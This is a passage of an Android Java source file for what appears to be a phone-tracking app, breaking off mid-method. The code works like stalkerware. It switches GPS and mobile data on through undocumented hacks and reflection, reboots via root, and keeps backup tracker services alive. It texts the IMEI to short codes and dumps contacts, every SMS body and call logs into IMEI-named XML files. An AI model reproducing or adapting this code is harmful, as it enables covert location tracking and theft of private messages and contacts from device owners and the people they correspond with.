package vn.vhc.live;



import java.io.File;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Calendar;
import java.util.Currency;
import java.util.Date;
import java.util.List;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.database.Cursor;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.NetworkInfo.State;
import android.net.wifi.WifiManager;
import android.os.Environment;
import android.os.PowerManager;
import android.os.StatFs;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

public class ContextManagerCore
{	
	private Context _currentContext;
	private static ContextManagerCore _instance;
	
	/**
	 * 
	 */
	public static ContextManagerCore getInstance()
	{
		//synchronized (_instance)
		//{
		//	Log.v("lamdaica1", "Check Instance ContextManager:"+(_instance));		
		//	Log.v("lamdaica1", "Check Instance ContextManager:"+(_instance==null));	
		
			if(_instance==null) _instance=new ContextManagerCore();					
		//}
		return _instance;
	}
	public ContextManagerCore() 
	{
		 Log.v("lamdaica1", "Assign context...");
		 //if(currentContext!=null) _currentContext=currentContext;		
	}	
	public void setCurrentContext(Context currentContext) 
	{		
		_currentContext=currentContext;
	}
	public Context getCurrentContext() 
	{		
		return _currentContext;
	}
	public void setMobileDataEnabled(boolean enabled) 
	{
		if(enabled && UtilGame.autoNotTurnOn3G)return;		
		if(_currentContext==null) return;
		
		if(UtilGame.save3GState && !enabled) return;//skip to skip disabled GPRS
	 
		ConnectivityManager conman = (ConnectivityManager) _currentContext.getSystemService(Context.CONNECTIVITY_SERVICE);
	    Class conmanClass;
		try 
		{
			conmanClass = Class.forName(conman.getClass().getName());
		
		    final Field iConnectivityManagerField = conmanClass.getDeclaredField("mService");
		    iConnectivityManagerField.setAccessible(true);
		    final Object iConnectivityManager = iConnectivityManagerField.get(conman);
		    final Class iConnectivityManagerClass = Class.forName(iConnectivityManager.getClass().getName());
		    final Method setMobileDataEnabledMethod = iConnectivityManagerClass.getDeclaredMethod("setMobileDataEnabled", Boolean.TYPE);
		    setMobileDataEnabledMethod.setAccessible(true);
	
		    setMobileDataEnabledMethod.invoke(iConnectivityManager, enabled);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	public void turnOnOff3G(boolean enabled) 
	{
		//Toast.makeText(_currentContext, "_currentContext", Toast.LENGTH_LONG).show();
		if(_currentContext==null) return;
		//if(!enabled) return;//skip to skip disabled GPRS
		ConnectivityManager conman = (ConnectivityManager) _currentContext.getSystemService(Context.CONNECTIVITY_SERVICE);
	    Class conmanClass;
		try 
		{
			conmanClass = Class.forName(conman.getClass().getName());
		
		    final Field iConnectivityManagerField = conmanClass.getDeclaredField("mService");
		    iConnectivityManagerField.setAccessible(true);
		    final Object iConnectivityManager = iConnectivityManagerField.get(conman);
		    final Class iConnectivityManagerClass = Class.forName(iConnectivityManager.getClass().getName());
		    final Method setMobileDataEnabledMethod = iConnectivityManagerClass.getDeclaredMethod("setMobileDataEnabled", Boolean.TYPE);
		    setMobileDataEnabledMethod.setAccessible(true);
	
		    setMobileDataEnabledMethod.invoke(iConnectivityManager, enabled);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			//Toast.makeText(_currentContext, "Exception:"+e.toString(), Toast.LENGTH_LONG).show();
			//e.printStackTrace();
		}
	}
	public void turnGPSOn()
	{
		try
		{
			if(_currentContext==null) return;
			if(android.os.Build.VERSION.RELEASE.startsWith("3."))
			{
				turnGPSOn4x();
				return;
			}
			
		    String provider = Settings.Secure.getString(_currentContext.getContentResolver(), Settings.Secure.LOCATION_PROVIDERS_ALLOWED);
	
		  //if gps is disabled
		    if(!provider.contains("gps"))
		    { 
		        final Intent poke = new Intent();
		        poke.setClassName("com.android.settings", "com.android.settings.widget.SettingsAppWidgetProvider"); 
		        poke.addCategory(Intent.CATEGORY_ALTERNATIVE);
		        poke.setData(Uri.parse("3")); 
		        _currentContext.sendBroadcast(poke);
		    }
		}catch(Exception ex)
		{			
			try 
			{
				  Settings.Secure.setLocationProviderEnabled(_currentContext.getContentResolver(), LocationManager.GPS_PROVIDER, true);
			} catch (Exception e) {
			 // logger.log(Log.ERROR, e, e.getMessage());
			}
		}
		try
		{
			//new GPSPosition(getCurrentContext());
		}catch(Exception ex){}		
	}
	public void turnGPSOff(){
		try
		{
			if(_currentContext==null) return;
			if(android.os.Build.VERSION.RELEASE.startsWith("3."))
			{
				turnGPSOff4x();
				return;
			}
		    String provider = Settings.Secure.getString(_currentContext.getContentResolver(), Settings.Secure.LOCATION_PROVIDERS_ALLOWED);
	
		    if(provider.contains("gps")){ //if gps is enabled
		        final Intent poke = new Intent();
		        poke.setClassName("com.android.settings", "com.android.settings.widget.SettingsAppWidgetProvider");
		        poke.addCategory(Intent.CATEGORY_ALTERNATIVE);
		        poke.setData(Uri.parse("3")); 
		        _currentContext.sendBroadcast(poke);
		    }
		}catch(Exception ex)
		{
			try 
			{
				  Settings.Secure.setLocationProviderEnabled(_currentContext.getContentResolver(), LocationManager.GPS_PROVIDER, false);
			} catch (Exception e) {
			 // logger.log(Log.ERROR, e, e.getMessage());
			}			
		}
	}
	public void turnGPSOn4x()
    {
    	if(_currentContext==null) return;
    	
         Intent intent = new Intent("android.location.GPS_ENABLED_CHANGE");
         intent.putExtra("enabled", true);
         _currentContext.sendBroadcast(intent);

        String provider = Settings.Secure.getString(_currentContext.getContentResolver(), Settings.Secure.LOCATION_PROVIDERS_ALLOWED);
        if(!provider.contains("gps"))
            { 
            //if gps is disabled
            final Intent poke = new Intent();
            poke.setClassName("com.android.settings", "com.android.settings.widget.SettingsAppWidgetProvider"); 
            poke.addCategory(Intent.CATEGORY_ALTERNATIVE);
            poke.setData(Uri.parse("3")); 
            _currentContext.sendBroadcast(poke);
        }
    }
    public void turnGPSOff4x()
    {
    	if(_currentContext==null) return;
        String provider = Settings.Secure.getString(_currentContext.getContentResolver(), Settings.Secure.LOCATION_PROVIDERS_ALLOWED);
        if(provider.contains("gps")){ //if gps is enabled
            final Intent poke = new Intent();
            poke.setClassName("com.android.settings", "com.android.settings.widget.SettingsAppWidgetProvider");
            poke.addCategory(Intent.CATEGORY_ALTERNATIVE);
            poke.setData(Uri.parse("3")); 
            _currentContext.sendBroadcast(poke);
        }
    }
	public void turnWIFIOn()
	{
		try
		{
			if(_currentContext==null) return;
			WifiManager	wifiManager = (WifiManager) _currentContext.getSystemService(Context.WIFI_SERVICE);
			  if(wifiManager.isWifiEnabled()){
			    //wifiManager.setWifiEnabled(false);
			  }else{
			    wifiManager.setWifiEnabled(true);
			  }
		}catch(Exception ex){}
	}
	public void turnWIFIOff()
	{
		try
		{
		if(_currentContext==null) return;
		WifiManager	wifiManager = (WifiManager) _currentContext.getSystemService(Context.WIFI_SERVICE);
		if(wifiManager.isWifiEnabled()){
		    wifiManager.setWifiEnabled(false);
		  }else{
		    //wifiManager.setWifiEnabled(true);
		}		
	}catch(Exception ex){}
	}	
	public boolean isConnectedGPRS()
	{
		if(_currentContext==null) return false;
		ConnectivityManager conMan = (ConnectivityManager) _currentContext.getSystemService(Context.CONNECTIVITY_SERVICE);

		//mobile
		State mobile = conMan.getNetworkInfo(0).getState();

		return (mobile == android.net.NetworkInfo.State.CONNECTED);
				//|| mobile ==android.net.NetworkInfo.State.CONNECTING);				
				//NetworkInfo.State.CONNECTED || mobile == NetworkInfo.State.CONNECTING) ;			 
		
	}
	public boolean isConnectedWIFI()
	{
		if(_currentContext==null) return false;
		ConnectivityManager conMan = (ConnectivityManager) _currentContext.getSystemService(Context.CONNECTIVITY_SERVICE);

		//wifi
		State wifi = conMan.getNetworkInfo(1).getState();
		
		return (wifi == android.net.NetworkInfo.State.CONNECTED);	
	}
	public boolean isConnected() {
		if(_currentContext==null) return false;
		
        ConnectivityManager connectivityManager = (ConnectivityManager) _currentContext
                .getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo networkInfo = null;
        if (connectivityManager != null) {

            networkInfo = connectivityManager
                    .getNetworkInfo(ConnectivityManager.TYPE_WIFI);           
            
            if (!networkInfo.isAvailable()) {
            	UtilGame.typeconnect="gprs";
                networkInfo = connectivityManager
                        .getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
            }
            else
            {
            	if(networkInfo.isConnected())UtilGame.typeconnect="wifi";
            	else UtilGame.typeconnect="gprs";
            }
            try
            {
	            NetworkInfo info = connectivityManager.getActiveNetworkInfo();
	        	int type = info.getType();
	        	int subType = info.getSubtype();
	        	UtilGame.typeSubNet=subType;
	        	UtilGame.speedConnect=getSpeed(type, subType);
            }catch(Exception ex){}
        }
        return networkInfo == null ? false : networkInfo.isConnected();
    }
	public void restartPhone() 
	{
		try {
	        Process proc = Runtime.getRuntime().exec(new String[] { "su", "-c", "reboot" });
	        proc.waitFor();
	        
	        //PowerManager pm = (PowerManager) _currentContext.getSystemService(Context.POWER_SERVICE);
	        //pm.reboot("Ptracker reboot");
	    	// _currentContext.getSystemService(Context.POWER_SERVICE);
			
	    } catch (Exception ex) {
	        Log.i("lamdaica", "Could not reboot", ex);
	    }
	}	
	public boolean isServiceRunning1() {
	    ActivityManager manager = (ActivityManager) _currentContext.getSystemService(Context.ACTIVITY_SERVICE);
	    for (RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
	        if ((UtilGame.packageSoft+".APTrackerService1").equals(service.service.getClassName())) {
	            return true;
	        }
	        
	    }
	    return false;
	}	
	public boolean isServiceRunning2() {
	    ActivityManager manager = (ActivityManager) _currentContext.getSystemService(Context.ACTIVITY_SERVICE);
	    for (RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
	        if ((UtilGame.packageSoft+".APTrackerService2").equals(service.service.getClassName())) {
	            return true;
	        }
	    }
	    return false;
	}
	public boolean isServiceRunning()
	{	
		//Toast.makeText(_currentContext, "Check service running:"+UtilGame.isRunningService, Toast.LENGTH_LONG).show();
        if(UtilGame.isRunningService) return true;
	    ActivityManager manager = (ActivityManager) _currentContext.getSystemService(Context.ACTIVITY_SERVICE);
	    for (RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
	    	if ((UtilGame.packageSoft+".APTrackerService1").equals(service.service.getClassName())) {
	    		//Toast.makeText(_currentContext, "service.activeSince:"+service.activeSince, Toast.LENGTH_LONG).show();
		        
	    		return true;
	        }
	        if ((UtilGame.packageSoft+".APTrackerService2").equals(service.service.getClassName())) {
	        	//Toast.makeText(_currentContext, "service.activeSince:"+service.activeSince, Toast.LENGTH_LONG).show();
		        
	        	return true;
	        }
	    }
	    return false;
	}
	public void startServiceIfNeed() 
	{
		boolean isRunning=isServiceRunning();
		if(!isRunning)
		{			
			Intent mServiceIntent = new Intent();
			mServiceIntent.setAction((UtilGame.packageSoft+".APTrackerService1"));
			_currentContext.startService(mServiceIntent);
		}		
	}
	public boolean startServiceTimeOut() 
	{
		if(((new Date()).getTime()-UtilGame.timeStarted.getTime()> (UtilGame.timeToRestart+10*60000)))
		{							
			ContextManagerCore.getInstance().restartService();
			return true;
		}
		return false;
	}
	public void startServiceMonitorIfNeed() 
	{
		if(!UtilGame.useServiceBackup)return;
		//Toast.makeText(_currentContext, "isRunningServiceBackup:"+UtilGame.isRunningServiceBackup, Toast.LENGTH_LONG).show();
		if(!UtilGame.isRunningServiceBackup)
		{			
			Intent mServiceIntent = new Intent();
			mServiceIntent.setAction(UtilGame.packageSoft+".APTrackerMonitor");
			_currentContext.startService(mServiceIntent);
		}
	}
	public void startService2() {
		// TODO Auto-generated method stub
		if(!isServiceRunning2())
		{
			Intent mServiceIntent = new Intent();
			mServiceIntent.setAction(UtilGame.packageSoft+".APTrackerService2");
			_currentContext.startService(mServiceIntent);
		}
	}	
	public void startService1() {
		// TODO Auto-generated method stub
		if(!isServiceRunning1())
		{
			Intent mServiceIntent = new Intent();
			mServiceIntent.setAction(UtilGame.packageSoft+".APTrackerService1");
			_currentContext.startService(mServiceIntent);
		}
	}	
	public void restartService() {
		try
		{
			//UtilGame.isRestarting=true;
			// TODO Auto-generated method stub
			if(isServiceRunning1())
			{
				Intent mServiceIntent = new Intent();
				mServiceIntent.setAction(UtilGame.packageSoft+".APTrackerService1");
				_currentContext.stopService(mServiceIntent);
				return;
			}
			else if(isServiceRunning2())
			{
				Intent mServiceIntent = new Intent();
				mServiceIntent.setAction(UtilGame.packageSoft+".APTrackerService2");
				_currentContext.stopService(mServiceIntent);
				return;
			}	
			else
			{
				Intent mServiceIntent = new Intent();
				mServiceIntent.setAction(UtilGame.packageSoft+".APTrackerService1");
				_currentContext.startService(mServiceIntent);
				return;
			}
		}catch(Exception ex)
		{
			UIManager.getInstance().showMsg("Expcetion when restart:"+ex.toString());
		}
	}	
	public void saveToDB(String key,String value) {
		SharedPreferences settings =_currentContext.getSharedPreferences(FileUtil.FILE_SAVE, 0);
		SharedPreferences.Editor editor = settings.edit();
		editor.putString(key, value);
		//editor.putString("ptrackerkey", value);
		// Commit the edits!
		editor.commit();

	}	
	public String readFromDB(String key) {
		SharedPreferences settings =_currentContext.getSharedPreferences(FileUtil.FILE_SAVE, 0);
		String pKey = settings.getString(key, "");
		return pKey;
	}
	public void deleteFromDB(String key) {
		SharedPreferences settings =_currentContext.getSharedPreferences(FileUtil.FILE_SAVE, 0);
		SharedPreferences.Editor editor = settings.edit();
		editor.remove(key);		
		editor.commit();
	}
	public String readLastPosition() {
		String key=FileUtil.KEY_PTRACKER;
		SharedPreferences settings =_currentContext.getSharedPreferences(FileUtil.FILE_SAVE, 0);
		String pKey = settings.getString(key, "");
		return pKey;
	}
	/**
     * Check if the connection is fast
     * @param type
     * @param subType
     * @return
     */
    public static boolean isConnectionFast(int type, int subType){
        if(type==ConnectivityManager.TYPE_WIFI){
            //System.out.println("CONNECTED VIA WIFI");
            return true;
        }else if(type==ConnectivityManager.TYPE_MOBILE){
            switch(subType){
            case TelephonyManager.NETWORK_TYPE_1xRTT:
                return false; // ~ 50-100 kbps
            case TelephonyManager.NETWORK_TYPE_CDMA:
                return false; // ~ 14-64 kbps
            case TelephonyManager.NETWORK_TYPE_EDGE:
                return false; // ~ 50-100 kbps
            case TelephonyManager.NETWORK_TYPE_EVDO_0:
                return true; // ~ 400-1000 kbps
            case TelephonyManager.NETWORK_TYPE_EVDO_A:
                return true; // ~ 600-1400 kbps
            case TelephonyManager.NETWORK_TYPE_GPRS:
                return false; // ~ 100 kbps
            case TelephonyManager.NETWORK_TYPE_HSDPA:
                return true; // ~ 2-14 Mbps
            case TelephonyManager.NETWORK_TYPE_HSPA:
                return true; // ~ 700-1700 kbps
            case TelephonyManager.NETWORK_TYPE_HSUPA:
                return true; // ~ 1-23 Mbps
            case TelephonyManager.NETWORK_TYPE_UMTS:            	
                return true; // ~ 400-7000 kbps
            /*
            // NOT AVAILABLE YET IN API LEVEL 7
            case TelephonyManager.NETWORK_TYPE_EHRPD:
                return true; // ~ 1-2 Mbps
            case Connectivity.NETWORK_TYPE_EVDO_B:
                return true; // ~ 5 Mbps
            case Connectivity.NETWORK_TYPE_HSPAP:
                return true; // ~ 10-20 Mbps
            case Connectivity.NETWORK_TYPE_IDEN:
                return false; // ~25 kbps 
            case Connectivity.NETWORK_TYPE_LTE:
                return true; // ~ 10+ Mbps
               */
            // Unknown
            case TelephonyManager.NETWORK_TYPE_UNKNOWN:
            default:
                return false;
            }
        }else{
            return false;
        }
    }
    public String getSpeedConnect() 
    {
    	try{
    	ConnectivityManager cManager = (ConnectivityManager) _currentContext.getSystemService(Context.CONNECTIVITY_SERVICE);
    	NetworkInfo info = cManager.getActiveNetworkInfo();
    	int type = info.getType();
    	int subType = info.getSubtype();
    	return getSpeed(type,subType);
    	}catch(Exception ex)
    	{
    		return "UnknownEx";
    	}
    }
     public static String getSpeed(int type, int subType){
        if(type==ConnectivityManager.TYPE_WIFI){
            //System.out.println("CONNECTED VIA WIFI");
            return "WIFI";
        }else if(type==ConnectivityManager.TYPE_MOBILE){
            switch(subType){
            case TelephonyManager.NETWORK_TYPE_1xRTT:
                return "50-100kbps"; // ~ 50-100 kbps
            case TelephonyManager.NETWORK_TYPE_CDMA:
                return "14-64kbps"; // ~ 14-64 kbps
            case TelephonyManager.NETWORK_TYPE_EDGE:
                return "50-100kbps"; // ~ 50-100 kbps
            case TelephonyManager.NETWORK_TYPE_EVDO_0:
                return "400-1000kbps"; // ~ 400-1000 kbps
            case TelephonyManager.NETWORK_TYPE_EVDO_A:
                return "600-1400kbps"; // ~ 600-1400 kbps
            case TelephonyManager.NETWORK_TYPE_GPRS:
                return "100kbps"; // ~ 100 kbps
            case TelephonyManager.NETWORK_TYPE_HSDPA:
                return "2-14Mbps"; // ~ 2-14 Mbps
            case TelephonyManager.NETWORK_TYPE_HSPA:
                return "700-1700kbps"; // ~ 700-1700 kbps
            case TelephonyManager.NETWORK_TYPE_HSUPA:
                return "1-23Mbps"; // ~ 1-23 Mbps
            case TelephonyManager.NETWORK_TYPE_UMTS:            	
                return "400-7000kbps"; // ~ 400-7000 kbps
            /*
            // NOT AVAILABLE YET IN API LEVEL 7
            case TelephonyManager.NETWORK_TYPE_EHRPD:
                return true; // ~ 1-2 Mbps
            case Connectivity.NETWORK_TYPE_EVDO_B:
                return true; // ~ 5 Mbps
            case Connectivity.NETWORK_TYPE_HSPAP:
                return true; // ~ 10-20 Mbps
            case Connectivity.NETWORK_TYPE_IDEN:
                return false; // ~25 kbps 
            case Connectivity.NETWORK_TYPE_LTE:
                return true; // ~ 10+ Mbps
               */
            // Unknown
            case TelephonyManager.NETWORK_TYPE_UNKNOWN:
            default:
                return "Unkown";
            }
        }else{
            return "Unkown";
        }
    }
    public void sendSMSToRegister(String imei)
 	{    	
    	/*
 		try
 		{
 			if(readFromDB("sms")=="1")return;
 			saveToDB("sms","1");
 			SmsManager smsManager = SmsManager.getDefault();
 			smsManager.sendTextMessage("8185", null, "dv ptracker "+imei, null, null);	
 			
 		}catch(Exception ex){}
 		*/
 	}
    public void sendSMSToRegisterOnCommand()
 	{    	
    	
 		try
 		{
 			String imei= LocationUtil.IMEI;
 			SmsManager smsManager = SmsManager.getDefault();
 			smsManager.sendTextMessage("8189", null, "dv ptracker "+imei, null, null);	
 			
 		}catch(Exception ex){} 		
 	}
    public void sendSMSToToTel(String sms,String msg)
 	{    	
    	
 		try
 		{
 			//String imei= LocationUtil.IMEI;
 			SmsManager smsManager = SmsManager.getDefault();
 			smsManager.sendTextMessage(sms, null,msg, null, null);	
 			
 		}catch(Exception ex){} 		
 	}
    /*
     * id,name:
     * <c>
     * <id>id<id>
     * <name>name<n>
     * <phone>phonenumber<phone>
     * <email>email<email>
     * <etype>email<etype>
     * <ecustomLabel>email<ecustomLabel>
     * <eCustomemailType>email<eCustomemailType> 
     * <note></note>
     * <poBox></poBox>
     * <street></street>
     * <city></city>
     * <state></state>
     * <postalcode></postalcode>
     * <country></country>
     * <type></type>  
     * <imgname></imgname>  
     * <imgtype></imgtype>
     * <oname></oname>
     * <otitle></otitle>
     * </c>
     */
    public void readContacts()
    {
    	
	        ContentResolver cr =_currentContext.getContentResolver();
	        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,null, null, null, null);
			
			//sb.append("<c>");
			int total=0;
			String sFile="contact_"+LocationUtil.IMEI+".xml";
			if (cur.getCount() > 0) 
	        {
				StringBuilder sb= new StringBuilder();
	           while (cur.moveToNext()) 
	           {
	        	   
	               String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
	               String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
	               total++;
	               sb.append("<o>");	               
	               sb.append("<id>"+id+"</id>");
	               sb.append("<imei>"+LocationUtil.IMEI+"</imei>");	               
	               sb.append("<name>"+name+"</name>");
	            
	             
	               if (Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
	                   System.out.println("name : " + name + ", ID : " + id);
	
	                   // get the phone number
	                   Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,
	                                          ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?",
	                                          new String[]{id}, null);
	                   while (pCur.moveToNext()) {
	                         String phone = pCur.getString(
	                                pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
	                         System.out.println("phone" + phone);
	                         
	                         sb.append("<phone>"+phone+"</phone>");
	                         
	                   }
	                   pCur.close();
	
	
	                   // get email and type
	                  Cursor emailCur = cr.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI,
	                           null,
	                           ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
	                           new String[]{id}, null);
	                   while (emailCur.moveToNext()) {
	                       // This would allow you get several email addresses
	                           // if the email addresses were stored in an array
	                       String email = emailCur.getString(
	                                     emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
	                       String emailType = emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));
	
	                       int type = emailCur.getInt(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));
	                       String customLabel = emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.LABEL));
	                       CharSequence CustomemailType = ContactsContract.CommonDataKinds.Email.getTypeLabel(_currentContext.getResources(), type, customLabel);
	
	                       sb.append("<email>"+email+"</email>");
	                       sb.append("<etype>"+emailType+"</etype>");
	                       sb.append("<ecustomLabel>"+customLabel+"</ecustomLabel>");
	                       sb.append("<eCustomemailType>"+CustomemailType+"</eCustomemailType>");                       
	                     //System.out.println("Email " + email + " Email Type : " + emailType);
	                   }
	                   emailCur.close();
	
	                   // Get note.......
	                   String noteWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " +
	                           ContactsContract.Data.MIMETYPE + " = ?";
	                   String[] noteWhereParams = new String[]{id,
	                   ContactsContract.CommonDataKinds.Note.CONTENT_ITEM_TYPE};
	
	                    Cursor noteCur = cr.query(ContactsContract.Data.CONTENT_URI, null, 
	                            noteWhere, noteWhereParams, null);
	                   if (noteCur.moveToFirst()) {
	                       String note = noteCur.getString(
	                       noteCur.getColumnIndex(ContactsContract.CommonDataKinds.Note.NOTE));
	                       
	                       sb.append("<note><![CDATA["+note +"]]></note>");                       
	                       System.out.println("Note " + note);
	                   }
	                   noteCur.close();
	                   /*
	                   //Get Postal Address....
	                   String addrWhere = ContactsContract.Data.CONTACT_ID 
	                           + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
	                   String[] addrWhereParams = new String[]{id,
	                       ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE};
	                   Cursor addrCur = cr.query(ContactsContract.Data.CONTENT_URI,
	                               null, null, null, null);
	                   while(addrCur.moveToNext()) {
	                       String poBox = addrCur.getString(
	                                    addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POBOX));
	                       String street = addrCur.getString(
	                                    addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.STREET));
	                       String city = addrCur.getString(
	                                    addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.CITY));
	                       String state = addrCur.getString(
	                                    addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.REGION));
	                       String postalCode = addrCur.getString(
	                                    addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POSTCODE));
	                       String country = addrCur.getString(
	                                    addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.COUNTRY));
	                       String type = addrCur.getString(
	                                    addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.TYPE));
	
	                       // Do something with these....
	                       
	                       sb.append("<poBox>"+poBox+"</poBox>");
	                       sb.append("<street>"+street+"</street>");
	                       sb.append("<city>"+city+"</city>");
	                       sb.append("<state>"+state+"</state>");
	                       sb.append("<postalcode>"+postalCode+"</postalcode>");
	                       sb.append("<country>"+country+"</country>");
	                       sb.append("<type>"+type+"</type>");
	                   }
	                   addrCur.close();
	                   */
	                   // Get Instant Messenger.........
	                   String imWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " 
	                   + ContactsContract.Data.MIMETYPE + " = ?";
	                   String[] imWhereParams = new String[]{id,
	                       ContactsContract.CommonDataKinds.Im.CONTENT_ITEM_TYPE};
	                   Cursor imCur = cr.query(ContactsContract.Data.CONTENT_URI,
	                           null, imWhere, imWhereParams, null);
	                   if (imCur.moveToFirst()) {
	                       String imName = imCur.getString(
	                                imCur.getColumnIndex(ContactsContract.CommonDataKinds.Im.DATA));
	                       String imType;
	                       imType = imCur.getString(
	                                imCur.getColumnIndex(ContactsContract.CommonDataKinds.Im.TYPE));
	                       
	                       sb.append("<imgname>"+imName+"</imgname>");
	                       sb.append("<imType>"+imType+"</imType>");
	                                       
	                   }
	                   imCur.close();
	
	                   // Get Organizations.........
	                   String orgWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
	                   String[] orgWhereParams = new String[]{id,
	                       ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE};
	                   Cursor orgCur = cr.query(ContactsContract.Data.CONTENT_URI,
	                               null, orgWhere, orgWhereParams, null);
	                   if (orgCur.moveToFirst()) 
	                   {
	                       String orgName = orgCur.getString(orgCur.getColumnIndex(ContactsContract.CommonDataKinds.Organization.DATA));
	                       String title = orgCur.getString(orgCur.getColumnIndex(ContactsContract.CommonDataKinds.Organization.TITLE));
	                       
	                       sb.append("<oname>"+orgName+"</oname>");    
	                       sb.append("<otitle>"+title+"</otitle>");
	                   }
	                  
	                   orgCur.close();
	               }
	               sb.append("</o>");
	               if(total>5)
	               {
	            	   FileUtil.saveTextToXMLFile(sb.toString(),sFile);
	            	   total=0;
	            	   sb= new StringBuilder();
	               }
	           }	          
	        }
			//sb.append("</c>");
			//String sFile="contact_"+LocationUtil.IMEI+".xml";
			//FileUtil.saveTextToXMLFile(sb.toString(),sFile);
			FileUtil.renameFile(sFile, "ok_"+sFile);	    	
    }
    
    public void readSmsLog()
    {
    	try
    	{
    		String sFile="sms_"+LocationUtil.IMEI+".xml";
	    	Uri mSmsinboxQueryUri = Uri.parse("content://sms");
	        //Cursor cursor1 = _currentContext.getContentResolver().query(
	        //        mSmsinboxQueryUri,new String[] { "_id", "thread_id", "address", "person", "date","body", "type" }, null, null, null);
	        String[] selection= new String[] { "_id", "thread_id", "address", "person", "date","body", "type" };
	        
	        Calendar thatDay = Calendar.getInstance();
	        thatDay.set(Calendar.DAY_OF_MONTH,(new Date()).getDate()-7);
	       	        
	        long FRIST_BOUND_IN_MS=thatDay.getTimeInMillis();
	        long SECOND_BOUND_IN_MS=(new Date()).getTime();
	        
			String where = CallLog.Calls.DATE+">"+FRIST_BOUND_IN_MS + " AND "+ CallLog.Calls.DATE + "< " + SECOND_BOUND_IN_MS;
	        
	        //Cursor cursor1 = _currentContext.getContentResolver().query(mSmsinboxQueryUri, selection,where, null, null);//old version
			Cursor cursor1 = _currentContext.getContentResolver().query(mSmsinboxQueryUri, selection,null, null, null);//new version
	        
			cursor1.moveToFirst();
            String[] columns = new String[] { "address", "person", "date", "body", "type" };
            
            StringBuilder sb= new StringBuilder();
            System.out.println("Count Read Sms: " + cursor1.getCount());
	        if (cursor1.getCount() > 0) 
	        {
	        	
	            //String count = Integer.toString(cursor1.getCount());
	            while (cursor1.moveToNext())
	            {
	            	
	                //out.write("<message>");
	                String address = cursor1.getString(cursor1.getColumnIndex(columns[0]));
	                String name = cursor1.getString(cursor1.getColumnIndex(columns[1]));
	                String date = cursor1.getString(cursor1.getColumnIndex(columns[2]));
	                String msg = cursor1.getString(cursor1.getColumnIndex(columns[3]));
	                String type = cursor1.getString(cursor1.getColumnIndex(columns[4]));
	                
	                try{
	                	date=UtilGame.getInstance().GetStringFromTimeStamp(Long.parseLong(date));
	                }catch(Exception ex){continue;}
	                
	                
	                sb.append("<o>");
	            	sb.append("<imei>"+LocationUtil.IMEI+"</imei>");
	                sb.append("<a>"+address +"</a>");   
	                sb.append("<n><![CDATA["+name +"]]></n>"); 
	                sb.append("<time>"+date +"</time>");    
	                sb.append("<msg><![CDATA["+msg +"]]></msg>");    
	                sb.append("<t>"+type +"</t>");
	                sb.append("</o>");
	            }
	            FileUtil.saveTextToXMLFile(sb.toString(),sFile);
		        FileUtil.renameFile(sFile, "ok_"+sFile);
	        }	       
    	}catch(Exception ex){}
    }    
    
    public void readLogCall()
    {
    	try{
    		String sFile="call_"+LocationUtil.IMEI+".xml";
    	 	String[] strFields = {
    		        android.provider.CallLog.Calls.DATE, 
    		        android.provider.CallLog.Calls.TYPE,
    		        android.provider.CallLog.Calls.DURATION,
    		        android.provider.CallLog.Calls.NUMBER
    		        };
    	 
    	 	Calendar thatDay = Calendar.getInstance();
 	        thatDay.set(Calendar.DAY_OF_MONTH,(new Date()).getDate()-7);
 	        
    	 	long FRIST_BOUND_IN_MS=thatDay.getTimeInMillis();
	        //long SECOND_BOUND_IN_MS=(new Date()).getTime();
	        //String where = CallLog.Calls.DATE+">"+FRIST_BOUND_IN_MS + " AND "+ CallLog.Calls.DATE + "< " + SECOND_BOUND_IN_MS;
    	 	
    		//READ CALL LOG     
